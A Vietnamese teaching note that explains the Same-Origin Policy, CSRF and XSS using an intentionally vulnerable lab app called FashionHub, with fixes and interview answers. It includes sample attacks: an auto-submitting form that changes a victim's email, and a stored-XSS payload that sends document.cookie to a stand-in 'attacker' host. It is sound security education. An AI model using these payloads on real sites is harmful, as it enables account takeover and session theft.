# Khái niệm: Same-Origin Policy, CSRF & XSS

> Hai vuln "hiểu nhầm nhiều nhất" của người mới là CSRF và XSS — vì cả hai đều xoay quanh
> **trình duyệt** và **origin**, không phải server. File này gỡ rối theo thứ tự:
> origin là gì → browser cho phép gì → CSRF lợi dụng gì → XSS lợi dụng gì → quan hệ 2 cái.

---

## 1. Origin là gì

**Origin** = `scheme + host + port` của một trang web.

```
https://shop.com/page      → origin: https://shop.com (port 443 mặc định)
https://shop.com:3000/x    → origin: https://shop.com:3000  ← KHÁC origin trên (khác port)
http://localhost:5173      → origin: http://localhost:5173
http://localhost:3000      → origin: http://localhost:3000  ← KHÁC (khác port)
```

## 2. Same-Origin Policy (SOP) — luật gốc của browser

SOP = browser cho **JavaScript của trang A** tự do **ĐỌC** dữ liệu của trang A, nhưng
**CẤM đọc** dữ liệu của trang B (origin khác).

```
Trang evil.com có <script> fetch('https://bank.com/api/balance') </script>
  → Request có GỬI đi (nếu cookie hợp lệ) — nhưng browser CHẶN evil.com ĐỌC response
  → SOP chống "đọc trộm dữ liệu cross-site"
```

**Nhưng SOP KHÔNG chặn việc GỬI request cross-site.** Browser vẫn cho phép gửi kiểu:

```
<img src="https://bank.com/transfer?to=evil&amount=999">   ← GET tự động
<form method="POST" action="https://bank.com/transfer">    ← POST khi user mở trang
<script src="https://api.example.com/x">                    ← GET
```

Đây chính là kẽ hở mà **CSRF** chui qua: *gửi được thì thôi, không cần đọc*.

## 3. CSRF — giả mạo request "nhân danh" nạn nhân

**CSRF (Cross-Site Request Forgery)** = kẻ tấn công khiến **browser của nạn nhân** tự gửi
một request **thay đổi trạng thái** tới trang nạn nhân đang đăng nhập — mà nạn nhân không hề hay biết.

### Điều kiện để CSRF thành công (4 cái đủ)

```
1. Request là STATE CHANGE (đổi email, chuyển tiền, đổi password...) — không phải đọc dữ liệu
2. Trang đích xác thực bằng COOKIE (cookie tự gửi kèm — lập trình viên không kiểm soát được)
3. KHÔNG có CSRF token (không có gì chứng minh "request này do form của chính trang tạo")
4. Cookie được gửi trong request cross-site → tức cookie KHÔNG bị SameSite chặn (None/Lax-hở)
```

### FashionHub (F03) — kịch bản đầy đủ

```
1. alice đăng nhập FashionHub → cookie session=3 (SameSite=None)
2. alice mở poc/csrf-poc.html  (trang của attacker — mở từ file:// hoặc domain khác)
3. Trang đó có form ẩn tự submit:
     <form method="POST" action="http://localhost:5173/api/profile/email">
       <input name="newEmail" value="alice@attacker.dev">
   Browser gửi kèm cookie session=3 (SameSite=None → KHÔNG chặn cross-site)
4. Server: cookie hợp lệ → đổi email alice → attacker dùng "quên mật khẩu" chiếm tài khoản
```

### Vì sao CSRF "không cần đọc response"?

Vì mục tiêu là **hành động**, không phải dữ liệu. Attacker không cần biết kết quả —
chỉ cần request được thực thi là đủ.

## 4. XSS — chạy JavaScript trong trang của nạn nhân

**XSS (Cross-Site Scripting)** = attacker nhét **JavaScript của mình** vào trang web,
khiến nó chạy **trong origin của nạn nhân** — tức có toàn quyền như code của chính trang đó.

### 3 loại XSS

```
Reflected:  payload nằm trong URL/request, server in lại ra trang (vd ?q=<script>)
            → nạn nhân phải BẤM link độc thì mới dính
Stored:     payload LƯU trong database (vd review), ai mở trang đều dính   ← lab F02
            → nguy hiểm nhất: không cần lừa click, admin mở trang quản trị là dính
DOM-based:  payload chỉ xử lý ở JavaScript phía client, không qua server
```

### XSS làm được gì (trong origin nạn nhân)

```
+ Đọc document.cookie           → nếu cookie không HttpOnly → lấy session (F02 chain)
+ Gọi API thay user             → kể cả cookie HttpOnly cũng vô dụng:
  fetch('/api/profile/email', {method:'POST', body:...})  ← cookie HttpOnly vẫn TỰ ĐỘNG gửi kèm
+ Sửa nội dung trang (keylogger giả, form giả bắt password...)
+ Redirect tới trang phishing
```

⚠️ Điểm dễ nhầm: **HttpOnly chống XSS đánh cắp cookie, nhưng KHÔNG chống XSS.** XSS vẫn
gọi API thay user được vì cookie (kể cả HttpOnly) vẫn được browser tự gửi kèm. HttpOnly chỉ
là 1 lớp giảm thiểu, không phải fix XSS.

### FashionHub (F02) — vì sao Stored XSS ở reviews nguy hiểm

```
mallory (không cần đăng nhập — D8) POST review:
  content = <img src=x onerror="fetch('http://attacker/c?'+document.cookie)">
→ Lưu THÔ vào DB, admin panel render bằng dangerouslySetInnerHTML
→ Admin MỞ trang admin (chỉ cần xem review mới nhất) → JS chạy với quyền admin
→ Cookie admin (không HttpOnly) gửi về attacker server → replay = chiếm session admin
```

## 5. Quan hệ CSRF ↔ XSS (hỏi phỏng vấn hay gặp)

| Câu hỏi | Trả lời |
|---|---|
| CSRF có cần đọc response không? | Không — chỉ cần request state-change được thực thi |
| XSS có cần cookie không? | Không — chạy code trong origin là đủ quyền (cookie chỉ là 1 mục tiêu) |
| Cái nào nguy hiểm hơn? | XSS — attacker code chạy "hợp pháp" trong origin, làm được gần như mọi thứ user làm được. CSRF chỉ làm được các action mà request cross-site gửi được |
| CSRF token có chống XSS không? | Không — XSS đọc được token ngay trong trang (đó là lý do HttpOnly không áp được cho CSRF token) |
| SameSite chống cái nào? | CSRF (chặn cookie gửi cross-site). KHÔNG chống XSS (XSS chạy cùng-site nên cookie vẫn gửi bình thường) |
| Vì sao 2 cái này đi chung trong 1 lab? | Cùng gốc "browser tin origin như thế nào": CSRF = lợi dụng browser tự gửi cookie cross-site; XSS = phá vỡ ranh giới origin từ bên trong |

## 6. Ghi nhớ cho interview

> "FashionHub có stored XSS ở reviews và CSRF ở đổi email — tôi để cookie SameSite=None để cả
> hai demo được trên browser hiện đại. Cách sửa tôi viết: sanitize/escape đầu vào + render text
> thuần cho XSS; CSRF token + SameSite=Lax cho CSRF. Điểm tôi học được: scanner không tự đăng
> nhập + post review được, nên 2 vuln này phải verify tay — đó là lý do tôi tin manual testing."
